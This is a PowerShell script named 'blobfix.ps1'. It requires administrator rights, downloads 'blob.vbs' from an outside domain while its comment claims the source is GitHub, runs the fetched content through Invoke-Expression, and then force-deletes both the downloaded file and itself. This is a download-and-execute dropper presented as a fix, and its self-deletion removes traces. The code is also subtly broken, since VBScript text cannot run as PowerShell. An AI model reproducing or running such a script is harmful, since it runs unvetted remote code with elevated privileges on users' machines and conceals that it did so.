# blobfix.ps1
# Purpose: Download and execute blob.vbs from GitHub, then clean up

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "This script requires administrative privileges. Please run PowerShell as Administrator."
    exit 1
}

# Define URLs and paths
$vbsUrl = "https://dl.cieverse.com/MarkX-V2.0/blob.vbs"
$tempDir = $env:TEMP
$vbsPath = Join-Path $tempDir "blob.vbs"
$scriptPath = $PSCommandPath

# Download the VBS file to temp directory
try {
    Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -ErrorAction Stop
}
catch {
    Write-Error "Failed to download VBS file: $_"
    exit 1
}

# Execute the VBS file using iex (irm ...)
try {
    $vbsContent = Invoke-RestMethod -Uri $vbsUrl -ErrorAction Stop
    Invoke-Expression $vbsContent
}
catch {
    Write-Error "Failed to execute VBS file: $_"
    exit 1
}

# Clean up: delete VBS and PS1 files
try {
    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Warning "Failed to delete temporary files: $_"
}
